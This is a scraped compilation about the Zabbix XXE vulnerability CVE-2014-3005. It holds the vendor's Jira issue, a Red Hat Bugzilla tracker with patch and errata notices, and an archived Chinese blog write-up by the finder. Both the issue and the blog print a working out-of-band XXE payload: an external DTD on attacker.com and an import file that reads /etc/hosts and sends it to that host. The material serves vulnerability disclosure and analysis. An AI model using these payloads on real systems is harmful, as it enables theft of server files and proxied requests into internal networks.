  [API (A)](/issues/?jql=project+%3D+ZBX+AND+component+%3D+%22API+%28A%29%22 "API (A) Issues related to JSON-RPC API."), [Frontend (F)](/issues/?jql=project+%3D+ZBX+AND+component+%3D+%22Frontend+%28F%29%22 "Frontend (F) Zabbix web-based user interface")
* **Labels:**
  + [frontend](/issues/?jql=labels+%3D+frontend "frontend")
  + [import](/issues/?jql=labels+%3D+import "import")
  + [security](/issues/?jql=labels+%3D+security "security")
  + [vulnerability](/issues/?jql=labels+%3D+vulnerability "vulnerability")
  + [xxe](/issues/?jql=labels+%3D+xxe "xxe")
* **Environment:**
  CentOS 6.5 x84
### Description

zabbix frontend support xml data import feature,and server-side use DOMDocument to parse xml.DOMDocument also parse the external dtd in default.So attacker can use a crafted xml to read arbitrary local file and send http request use zabbix server as a proxy.

==Reproduction:

ext.dtd place at <http://attacker.com/>

<!ENTITY % all

"<!ENTITY % send SYSTEM 'http://attacker.com/?%file;'>"

>

%all;

zabbix.xml to import:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">

<!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">

%dtd;

%send;

]]>

<zabbix\_export>

</zabbix\_export>

After import zabbix.xml to zabbix server,the contents of hosts file will send to attacker.com.Attacker can get the content by checking the website access log. If use <file:///etc/hosts> to replace php://filter/read=convert.base64-encode/resource=/etc/hosts.the file content will print on the web page as an error directly.

==

This bug was found by pnig0s@Freebuf

### Attachments

### Attachments

* Options
  + - [Sort By Name](/browse/ZBX-8151?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
    - [Sort By Date](/browse/ZBX-8151?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
    - [Ascending](/browse/ZBX-8151?attachmentOrder=asc#attachmentmodule "Ascending")
    - [Descending](/browse/ZBX-8151?attachmentOrder=desc#attachmentmodule "Descending")
    - [Thumbnails](/browse/ZBX-8151?attachmentViewMode=gallery#attachmentmodule "Thumbnails")
    - [List](/browse/ZBX-8151?attachmentViewMode=list#attachmentmodule "List")
    - [Download All](/secure/attachmentzip/28311.zip "Download all attachments as a ZIP file")

1. [![poc_screenshot_01.jpg](https://support.zabbix.com/secure/thumbnail/27872/_thumb_27872.png)](/secure/attachment/27872/poc_screenshot_01.jpg "poc_screenshot_01.jpg - Latest 2014 Apr 25 14:17 - pnig0s")[poc\_screenshot\_01.jpg](/secure/attachment/27872/poc_screenshot_01.jpg "poc_screenshot_01.jpg - Latest 2014 Apr 25 14:17 - pnig0s")46 kB2014 Apr 25 14:17
2. [![poc_screenshot_02.jpg](https://support.zabbix.com/secure/thumbnail/27873/_thumb_27873.png)](/secure/attachment/27873/poc_screenshot_02.jpg "poc_screenshot_02.jpg - Latest 2014 Apr 25 14:18 - pnig0s")[poc\_screenshot\_02.jpg](/secure/attachment/27873/poc_screenshot_02.jpg "poc_screenshot_02.jpg - Latest 2014 Apr 25 14:18 - pnig0s")55 kB2014 Apr 25 14:18
3. [ZBX\_8151\_2\_2\_2.patch](/secure/attachment/28912/ZBX_8151_2_2_2.patch "ZBX_8151_2_2_2.patch - Latest 2014 Jun 20 14:55 - Andrejs Čirkovs")2 kB2014 Jun 20 14:55
### Activity

### People

Assignee:

![Unassigned](https://support.zabbix.com/secure/useravatar?size=small&avatarId=10193)
Unassigned

Reporter:

![pnig0s](https://support.zabbix.com/secure/useravatar?size=small&avatarId=10192)
pnig0s

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

### Dates

Created:

2014 Apr 25 14:11

Updated:

2020 Jul 16 14:10

Resolved:

2014 Jun 26 13:39

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for SIA Zabbix. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)



=== Content from bugzilla.redhat.com_323f6319_20250125_183647.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1110496)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1110496)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1110496)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1110496

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1110496**](show_bug.cgi?id=1110496)
(CVE-2014-3005)
- [CVE-2014-3005](https://access.redhat.com/security/cve/CVE-2014-3005) zabbix: local file inclusion via XXE attack

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2014-3005 zabbix: local file inclusion via XXE attack

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2014-3005 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1110498](show_bug.cgi?id=1110498 "CLOSED ERRATA - CVE-2014-3005 zabbix: local file inclusion via XXE attack [fedora-all]") [1110499](show_bug.cgi?id=1110499 "CLOSED ERRATA - CVE-2014-3005 zabbix: local file inclusion via XXE attack [epel-6]") [1110500](show_bug.cgi?id=1110500 "CLOSED ERRATA - CVE-2014-3005 zabbix22: zabbix: local file inclusion via XXE attack [epel-6]") [1110501](show_bug.cgi?id=1110501 "CLOSED CURRENTRELEASE - CVE-2014-3005 zabbix: local file inclusion via XXE attack [epel-7]") [1110502](show_bug.cgi?id=1110502 "CLOSED ERRATA - CVE-2014-3005 zabbix20: zabbix: local file inclusion via XXE attack [epel-all]") [1110503](show_bug.cgi?id=1110503) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=1110496&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1110496&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2014-06-17 19:53 UTC by Vincent Danen | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 13:18 UTC ([History](show_activity.cgi?id=1110496)) | | [CC List:](page.cgi?id=fields.html#cclist) | 14 users (show)  brett.lentz ccoleman dan dmcphers jialiu jokerman jrusnack kseifried lmeyer mmccomas mmcgrath nelsonab orion volker27 | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2014-07-15 14:46:03 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1110496#c0)  Vincent Danen    2014-06-17 19:53:54 UTC  ``` It was reported [1],[2] that the Zabbix frontend supported an XML data import feature, where on the server it used DOMDocument to parse the XML.  By default, DOMDocument also parses the external DTD, which could allow a remote attacker to use a crafted XML file causing Zabbix to read an arbitrary local file, and send the contents of the specified file to a remote server.  This is fixed upstream via:  * svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8 * svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+  [1] <https://support.zabbix.com/browse/ZBX-8151> [2] <http://www.pnigos.com/?p=273>   ```  [Comment 2](show_bug.cgi?id=1110496#c2)  Vincent Danen    2014-06-17 19:56:18 UTC  ```  Created zabbix22 tracking bugs for this issue:  Affects: epel-6 [[bug 1110500](show_bug.cgi?id=1110500 "CLOSED ERRATA - CVE-2014-3005 zabbix22: zabbix: local file inclusion via XXE attack [epel-6]")]   ```  [Comment 3](show_bug.cgi?id=1110496#c3)  Vincent Danen    2014-06-17 19:56:21 UTC  ```  Created zabbix tracking bugs for this issue:  Affects: fedora-all [[bug 1110498](show_bug.cgi?id=1110498 "CLOSED ERRATA - CVE-2014-3005 zabbix: local file inclusion via XXE attack [fedora-all]")] Affects: epel-6 [[bug 1110499](show_bug.cgi?id=1110499 "CLOSED ERRATA - CVE-2014-3005 zabbix: local file inclusion via XXE attack [epel-6]")] Affects: epel-7 [[bug 1110501](show_bug.cgi?id=1110501 "CLOSED CURRENTRELEASE - CVE-2014-3005 zabbix: local file inclusion via XXE attack [epel-7]")]   ```  [Comment 4](show_bug.cgi?id=1110496#c4)  Vincent Danen    2014-06-17 19:56:24 UTC  ```  Created zabbix20 tracking bugs for this issue:  Affects: epel-all [[bug 1110502](show_bug.cgi?id=1110502 "CLOSED ERRATA - CVE-2014-3005 zabbix20: zabbix: local file inclusion via XXE attack [epel-all]")]   ```  [Comment 5](show_bug.cgi?id=1110496#c5)  Fedora Update System    2014-06-30 10:26:22 UTC  ``` zabbix-2.0.12-3.fc20 has been pushed to the Fedora 20 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 6](show_bug.cgi?id=1110496#c6)  Fedora Update System    2014-06-30 10:32:45 UTC  ``` zabbix-2.0.12-3.fc19 has been pushed to the Fedora 19 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 7](show_bug.cgi?id=1110496#c7)  Fedora Update System    2014-07-07 19:02:38 UTC  ``` zabbix20-2.0.12-2.el6 has been pushed to the Fedora EPEL 6 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 8](show_bug.cgi?id=1110496#c8)  Fedora Update System    2014-07-07 19:03:46 UTC  ``` zabbix20-2.0.12-2.el5 has been pushed to the Fedora EPEL 5 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 9](show_bug.cgi?id=1110496#c9)  Fedora Update System    2014-07-07 19:03:54 UTC  ``` zabbix-1.8.20-2.el6 has been pushed to the Fedora EPEL 6 stable repository.  If problems still persist, please make note of it in this bug report.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1110496&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from web.archive.org_079efc9c_20250126_110515.html ===


[Ask the publishers](https://change.org/LetReadersRead) to restore access to 500,000+ books.

Hamburger icon
An icon used to represent a menu that can be toggled by interacting with this icon.

[Internet Archive logo
A line drawing of the Internet Archive headquarters building faÃ§ade.](https://archive.org/ "Go home")

[Web icon
An illustration of a computer application window

Wayback Machine](https://web.archive.org "Expand web menu")

[Texts icon
An illustration of an open book.

Texts](https://archive.org/details/texts "Expand texts menu")

[Video icon
An illustration of two cells of a film strip.

Video](https://archive.org/details/movies "Expand video menu")

[Audio icon
An illustration of an audio speaker.

Audio](https://archive.org/details/audio "Expand audio menu")

[Software icon
An illustration of a 3.5" floppy disk.

Software](https://archive.org/details/software "Expand software menu")

[Images icon
An illustration of two photographs.

Images](https://archive.org/details/image "Expand images menu")

[Donate icon
An illustration of a heart shape

Donate](https://archive.org/donate/ "Expand donate menu")

[Ellipses icon
An illustration of text ellipses.

More](https://archive.org/about/ "Expand more menu")

[Donate icon
An illustration of a heart shape

"Donate to the archive"](https://archive.org/donate/?origin=iawww-mbhrt)

User icon
An illustration of a person's head and chest.
[Sign up](https://archive.org/account/signup)
|
[Log in](https://archive.org/account/login)

[Upload icon
An illustration of a horizontal line over an up pointing arrow.

Upload](https://archive.org/create)

Search icon
An illustration of a magnifying glass.

Search icon
An illustration of a magnifying glass.

### Internet Archive Audio

[![](https://archive.org/services/img/etree)Live Music Archive](https://archive.org/details/etree)

[![](https://archive.org/services/img/librivoxaudio)Librivox Free Audio](https://archive.org/details/librivoxaudio)

#### Featured

* [All Audio](https://archive.org/details/audio)
* [Grateful Dead](https://archive.org/details/GratefulDead)
* [Netlabels](https://archive.org/details/netlabels)
* [Old Time Radio](https://archive.org/details/oldtimeradio)
* [78 RPMs and Cylinder Recordings](https://archive.org/details/78rpm)

#### Top

* [Audio Books & Poetry](https://archive.org/details/audio_bookspoetry)
* [Computers, Technology and Science](https://archive.org/details/audio_tech)
* [Music, Arts & Culture](https://archive.org/details/audio_music)
* [News & Public Affairs](https://archive.org/details/audio_news)
* [Spirituality & Religion](https://archive.org/details/audio_religion)
* [Podcasts](https://archive.org/details/podcasts)
* [Radio News Archive](https://archive.org/details/radio)

### Images

[![](https://archive.org/services/img/metropolitanmuseumofart-gallery)Metropolitan Museum](https://archive.org/details/metropolitanmuseumofart-gallery)

[![](https://archive.org/services/img/clevelandart)Cleveland Museum of Art](https://archive.org/details/clevelandart)

#### Featured

* [All Images](https://archive.org/details/image)
* [Flickr Commons](https://archive.org/details/flickrcommons)
* [Occupy Wall Street Flickr](https://archive.org/details/flickr-ows)
* [Cover Art](https://archive.org/details/coverartarchive)
* [USGS Maps](https://archive.org/details/maps_usgs)

#### Top

* [NASA Images](https://archive.org/details/nasa)
* [Solar System Collection](https://archive.org/details/solarsystemcollection)
* [Ames Research Center](https://archive.org/details/amesresearchcenterimagelibrary)

### Software

[![](https://archive.org/services/img/internetarcade)Internet Arcade](https://archive.org/details/internetarcade)

[![](https://archive.org/services/img/consolelivingroom)Console Living Room](https://archive.org/details/consolelivingroom)

#### Featured

* [All Software](https://archive.org/details/software)
* [Old School Emulation](https://archive.org/details/tosec)
* [MS-DOS Games](https://archive.org/details/softwarelibrary_msdos_games)
* [Historical Software](https://archive.org/details/historicalsoftware)
* [Classic PC Games](https://archive.org/details/classicpcgames)
* [Software Library](https://archive.org/details/softwarelibrary)

#### Top

* [Kodi Archive and Support File](https://archive.org/details/kodi_archive)
* [Vintage Software](https://archive.org/details/vintagesoftware)
* [APK](https://archive.org/details/apkarchive)
* [MS-DOS](https://archive.org/details/softwarelibrary_msdos)
* [CD-ROM Software](https://archive.org/details/cd-roms)
* [CD-ROM Software Library](https://archive.org/details/cdromsoftware)
* [Software Sites](https://archive.org/details/softwaresites)
* [Tucows Software Library](https://archive.org/details/tucows)
* [Shareware CD-ROMs](https://archive.org/details/cdbbsarchive)
* [Software Capsules Compilation](https://archive.org/details/softwarecapsules)
* [CD-ROM Images](https://archive.org/details/cdromimages)
* [ZX Spectrum](https://archive.org/details/softwarelibrary_zx_spectrum)
* [DOOM Level CD](https://archive.org/details/doom-cds)

### Texts

[![](https://archive.org/images/widgetOL.png)Open Library](https://openlibrary.org/)

[![](https://archive.org/services/img/americana)American Libraries](https://archive.org/details/americana)

#### Featured

* [All Texts](https://archive.org/details/texts)
* [Smithsonian Libraries](https://archive.org/details/smithsonian)
* [FEDLINK (US)](https://archive.org/details/fedlink)
* [Genealogy](https://archive.org/details/genealogy)
* [Lincoln Collection](https://archive.org/details/lincolncollection)

#### Top

* [American Libraries](https://archive.org/details/americana)
* [Canadian Libraries](https://archive.org/details/toronto)
* [Universal Library](https://archive.org/details/universallibrary)
* [Project Gutenberg](https://archive.org/details/gutenberg)
* [Children's Library](https://archive.org/details/iacl)
* [Biodiversity Heritage Library](https://archive.org/details/biodiversity)
* [Books by Language](https://archive.org/details/booksbylanguage)
* [Additional Collections](https://archive.org/details/additional_collections)

### Video

[![](https://archive.org/services/img/tv)TV News](https://archive.org/details/tv)

[![](https://archive.org/services/img/911)Understanding 9/11](https://archive.org/details/911)

#### Featured

* [All Video](https://archive.org/details/movies)
* [Prelinger Archives](https://archive.org/details/prelinger)
* [Democracy Now!](https://archive.org/details/democracy_now_vid)
* [Occupy Wall Street](https://archive.org/details/occupywallstreet)
* [TV NSA Clip Library](https://archive.org/details/nsa)

#### Top

* [Animation & Cartoons](https://archive.org/details/animationandcartoons)
* [Arts & Music](https://archive.org/details/artsandmusicvideos)
* [Computers & Technology](https://archive.org/details/computersandtechvideos)
* [Cultural & Academic Films](https://archive.org/details/culturalandacademicfilms)
* [Ephemeral Films](https://archive.org/details/ephemera)
* [Movies](https://archive.org/details/moviesandfilms)
* [News & Public Affairs](https://archive.org/details/newsandpublicaffairs)
* [Spirituality & Religion](https://archive.org/details/spiritualityandreligion)
* [Sports Videos](https://archive.org/details/sports)
* [Television](https://archive.org/details/television)
* [Videogame Videos](https://archive.org/details/gamevideos)
* [Vlogs](https://archive.org/details/vlogs)
* [Youth Media](https://archive.org/details/youth_media)

Search the history of over 916 billion
[web pages](https://blog.archive.org/2016/10/23/defining-web-pages-web-sites-and-web-captures/)
on the Internet.

Search the Wayback Machine

Search icon
An illustration of a magnifying glass.

#### Mobile Apps

* [Wayback Machine (iOS)](https://apps.apple.com/us/app/wayback-machine/id1201888313)
* [Wayback Machine (Android)](https://play.google.com/store/apps/details?id=com.archive.waybackmachine&hl=en_US)

#### Browser Extensions

* [Chrome](https://chrome.google.com/webstore/detail/wayback-machine/fpnmgdkabkmnadcjpehmlllkndpkmiak)
* [Firefox](https://addons.mozilla.org/en-US/firefox/addon/wayback-machine_new/)
* [Safari](https://apps.apple.com/us/app/wayback-machine/id1472432422?mt=12)
* [Edge](https://microsoftedge.microsoft.com/addons/detail/wayback-machine/kjmickeoogghaimmomagaghnogelpcpn?hl=en-US)

#### Archive-It Subscription

* [Explore the Collections](https://www.archive-it.org/explore)
* [Learn More](https://www.archive-it.org/blog/learn-more/)
* [Build Collections](https://www.archive-it.org/contact-us)

### Save Page Now

Capture a web page as it appears now for use as a trusted citation in the future.

Please enter a valid web address

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

* [Sign up for free](https://archive.org/account/signup)
* [Log in](https://archive.org/account/login)

Search metadata

Search text contents

Search TV news captions

Search radio transcripts

Search archived web sites

[Advanced Search](https://archive.org/advancedsearch.php)

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate
  Donate icon
  An illustration of a heart shape](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

The Wayback Machine requires your browser to support JavaScript, please email info@archive.org
if you have any questions about this.

The Wayback Machine is an initiative of the
[Internet Archive](//archive.org/),
a 501(c)(3) non-profit, building a digital library of
Internet sites and other cultural artifacts in digital form.

Other [projects](//archive.org/projects/) include
[Open Library](https://openlibrary.org/) &
[archive-it.org](https://archive-it.org).

Your use of the Wayback Machine is subject to the Internet Archive's
[Terms of Use](//archive.org/about/terms.php).



=== Content from web.archive.org_8b7aca54_20250126_110513.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[11 captures](/web/20140622034155%2A/http%3A//www.pnigos.com/?p=273 "See a list of every capture for this URL")
22 Jun 2014 - 18 Jul 2024

| May | JUN | [**Sep**](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "17 Sep 2014") |
| Previous capture | 22 | [Next capture](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "00:46:52 Sep 17, 2014") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20150820194335/http%3A//www.pnigos.com/?p=273 "20 Aug 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140622034155/http://www.pnigos.com:80/?p=273

# [风井](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/ "风井")

## Know me then ignore me

### 菜单

[跳至内容](#content "跳至内容")

* [首页](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/)
* [About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7)
* [Papers](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=2)
* [FreeBuf](https://web.archive.org/web/20140622034155/http%3A//www.freebuf.com/)
* [VulBox](https://web.archive.org/web/20140622034155/https%3A//vulbox.com/)

# [CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

[1条回复](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comments "《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上的评论")

**0×01，背景：**

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

**0×02，漏洞说明：**

zabbix提供灵活的针对各项配置的导入/导出机制，支持XML的数据格式。后端在对导入的xml数据进行处理时，解析了外部实体，导致攻击者可以构造恶意的xml文件，读取zabbix服务器本地文件内容或以服务器为代理发起网络请求，扫描端口，探测内网。

**影响版本：**1.8.x-2.2（当前最新版）

**Found by：**pnig0s

**0×03，漏洞分析：**

问题代码存在于include/classes/import/CXmlImport18.php，395行：

```
public static function import($file) {
libxml_use_internal_errors(true);

$xml = new DOMDocument();
if (!$xml->loadXML($file)) {
    $text = '';
    foreach (libxml_get_errors() as $error) {
        switch ($error->level) {
            case LIBXML_ERR_WARNING:
                $text .= _('XML file contains errors').'. Warning '.$error->code.': ';
                break;
            case LIBXML_ERR_ERROR:
                $text .= _('XML file contains errors').'. Error '.$error->code.': ';
                break;
            case LIBXML_ERR_FATAL:
                $text .= _('XML file contains errors').'. Fatal Error '.$error->code.': ';
                break;
        }

        $text .= trim($error->message).' [ Line: '.$error->line.' | Column: '.$error->column.' ]';
        break;
    }
    libxml_clear_errors();

    throw new Exception($text);
}
```

代码首先初始化了DOMDocument对象，然后调用loadXML函数对导入的XML文件进行解析。DOMDocument，SimpleXML和XMLReader是PHP中三种最常用的处理XML的方式，这三种方式默认都支持对外部实体的解析，而这段代码中也没有明确禁止对外部实体的解析。

我们创建一个符合zabbix要求的xml文件，并在起始处声明外部实体。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "file:///etc/hosts">
]>
<zabbix_export>&file;</zabbix_export>
```

进入Configuration->Hosts->Import，并导入，发现回显报错，但不是预期的文件内容。

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/6631398426709.PNG "directly_error.PNG")

跟到报错信息所指的文件中，include/classes/import/CXmlImport18.php，第425行

```
if ($xml->childNodes->item(0)->nodeName != 'zabbix_export') {
    $xml2 = self::createDOMDocument();
    $xml2->appendChild($xml2->ownerDocument->importNode($xml->childNodes->item(0), true));
    self::$xml = $xml2->ownerDocument;
}
else {
    self::$xml = $xml;
}
```

代码判断了子节点的第一个结点是否为zabbix\_export，若不是则创建一个新的xml DOM文档并将之前的第一个结点复制到新的DOM文档中使用。而我们构造的xml文件的第一个结点是<!DOCTYPE xxx []>，文档类型的声明不符合一般结点的规范，因此在导入时报错。逻辑中断在这里不会继续执行，无法达到我们的目的。而文档类型的声明又必须紧邻xml头的声明，我们也不能调整DOCTYPE声明的位置。

看似这个问题变得鸡肋了，不过可以使用一些tricks，曲线救国，达到我们的目的。

这里使用<!ENTITY % xxx “”>的参数实体形式在loadXML阶段主动构造出一个报错，把我们想要获取的信息爆出来同时可以发送到攻击者的服务器。参数实体不同与通用实体，仅能在实体声明内部使用。

首先在攻击者的服务器attacker.com中建立ext.dtd，内容为：

```
<!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>"
>
%all;
```

将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

将该文件导入，返回结果如下

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/77481398426709.PNG "redirect_plaintext_error.PNG")

很好很强大，爆出了服务器的hosts文件内容。但是这里还有一个小问题，有些文件过长或包含特殊的符号，会截断我们特意构造的参数实体声明，导致文件内容读取不完整。不过好在万能的php提供了php://filter/read=convert.base64-encode/resource这一wrapper，可以以base64的编码形式读取任意文件。

于是将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

查看远端Web访问日志：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/65091398426709.PNG "1.PNG")

解码base64：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/32991398426709.PNG "burp_decode_hosts.PNG")
